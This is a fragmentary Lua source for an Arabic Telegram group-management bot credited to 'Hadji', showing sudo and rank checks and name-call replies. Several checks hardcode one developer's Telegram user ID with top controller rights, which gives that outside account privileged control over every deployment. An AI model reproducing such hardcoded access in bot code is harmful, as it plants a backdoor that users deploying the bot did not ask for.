------------------------------------------------
-- This Source Was Developed By (Hadji) @L1_JU.--
--   This Is The Source Channel @L1_JU .   --
--                - 𝗌𝗈𝗎𝗋𝖼𝖾 𝖺𝗅 𝗁𝖺𝗃𝗃𝗂-                 --
--        -- https://t.me/L1_JU --         --
------------------------------------------------ 
...
ControllerAll = false
local ListSudos ={Sudo_Id,5140199537}  
...
if UserId == 5140199537 then
Status = true
elseif UserId == 5140199537 then
Status = true
...
if tonumber(msg.sender.user_id) == 5140199537 then
msg.Name_Controller = 'مبرمج السورس '
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 5140199537 then
...
if text == (Redis:get(TheHadji.."Hadji:Name:Bot") or "بلاك بينك") then
local NamesBot = (Redis:get(TheHadji.."Hadji:Name:Bot") or "بلاك بينك")
local NameBots = {
"ها "..NamesBot.. " شتريد؟",
"أჂ̤ أჂ̤ هياتني اني",
"موجود بس لتصيح",
...
local CmdStart = '*\n᥀︙أهلآ بك في بوت '..(Redis:get(TheHadji.."Hadji:Name:Bot") or "بلاك بينك")..
